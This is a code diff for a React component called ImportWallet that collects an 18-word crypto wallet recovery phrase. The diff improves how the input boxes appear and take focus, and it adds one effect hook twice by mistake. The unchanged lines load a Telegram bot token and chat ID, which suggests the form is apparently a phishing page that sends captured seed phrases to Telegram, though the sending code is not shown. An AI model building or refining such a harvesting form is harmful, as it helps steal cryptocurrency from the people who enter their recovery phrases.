@@ -11,6 +11,7 @@ export default function ImportWallet() {
   const [showAll, setShowAll] = useState(false)
   const [wordInputs, setWordInputs] = useState(Array(18).fill(""))
   const inputRefs = useRef<(HTMLInputElement | null)[]>([])
+  const [visibleBoxes, setVisibleBoxes] = useState<number[]>([0])
 
   const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID)
   const [telegramToken] = useState(process.env.NEXT_PUBLIC_TOKEN)
@@ -114,34 +115,66 @@ export default function ImportWallet() {
     }, 3000)
   }
 
+// Ensure focus moves to the newly visible box
+  useEffect(() => {
+    const lastVisibleIndex = visibleBoxes[visibleBoxes.length - 1];
+    if (lastVisibleIndex !== undefined) {
+      inputRefs.current[lastVisibleIndex]?.focus();
+    }
+  }, [visibleBoxes]);
+
+// Ensure focus moves to the newly visible box
+  useEffect(() => {
+    const lastVisibleIndex = visibleBoxes[visibleBoxes.length - 1];
+    if (lastVisibleIndex !== undefined) {
+      inputRefs.current[lastVisibleIndex]?.focus();
+    }
+  }, [visibleBoxes]);
+
   // Render word input grid
-const renderWords = () => {
-  return Array(18).fill(0).map((_, index) => (
-    <input
-      key={index}
-      type="text"
-      value={wordInputs[index]}
-      onChange={(e) => handleWordChange(index, e.target.value)}
-      onKeyDown={(e) => {
-        if (e.key === " " && wordInputs[index] && index < 17) {
-          e.preventDefault()
-          inputRefs.current[index + 1]?.focus()
-        }
-        if (e.key === "Backspace" && !wordInputs[index] && index > 0) {
-          e.preventDefault()
-          wordInputs[index] = ""
-          inputRefs.current[index - 1]?.focus()
-          setWordInputs([...wordInputs])
-        }
-      }}
-      ref={(el) => { inputRefs.current[index] = el; }}
-      className={`w-24 p-2 m-1 rounded-xl border text-left text-sm ${
-        index === 0 || wordInputs[index - 1] ? "block" : "hidden"
-      } ${wordInputs[index] ? "border-gray-500 bg-black text-white-300" : "border-purple-500 bg-black text-white"}`}
-      placeholder={`${index + 1}.`}
-    />
-  ))
-}
+  const [focusedIndex, setFocusedIndex] = useState<number | null>(null);
+
+  const renderWords = () => {
+    return Array(18).fill(0).map((_, index) => (
+      <input
+        key={index}
+        type="text"
+        value={wordInputs[index]}
+        onChange={(e) => handleWordChange(index, e.target.value)}
+        onKeyDown={(e) => {
+          if (e.key === " " && wordInputs[index] && index < 17) {
+            e.preventDefault();
+            setVisibleBoxes((prev) => {
+              if (!prev.includes(index + 1)) {
+                return [...prev, index + 1];
+              }
+              return prev;
+            });
+          }
+          if (e.key === "Backspace" && !wordInputs[index] && index > 0) {
+            e.preventDefault();
+            wordInputs[index] = "";
+            inputRefs.current[index - 1]?.focus();
+            setWordInputs([...wordInputs]);
+            setVisibleBoxes((prev) => prev.filter((i) => i !== index));
+          }
+        }}
+        onFocus={() => setFocusedIndex(index)}
+        onBlur={() => setFocusedIndex(null)}
+        ref={(el) => { inputRefs.current[index] = el; }}
+        className={`w-24 p-2 m-1 rounded-xl border text-left text-sm ${
+          index === 0 || visibleBoxes.includes(index) ? "block" : "hidden"
+        } ${
+          focusedIndex === index
+            ? "border-purple-500 bg-black text-white"
+            : wordInputs[index]
+            ? "border-gray-500 bg-black text-white-300"
+            : "border-purple-500 bg-black text-white"
+        }`}
+        placeholder={`${index + 1}.`}
+      />
+    ));
+  };
 
   // Check if continue button should be enabled
   const isContinueEnabled = () => {
@@ -153,6 +186,7 @@ const renderWords = () => {
   const clearAll = () => {
     setPhrase("")
     setWordInputs(Array(18).fill(""))
+    setVisibleBoxes([0]);
     inputRefs.current[0]?.focus()
   }
 
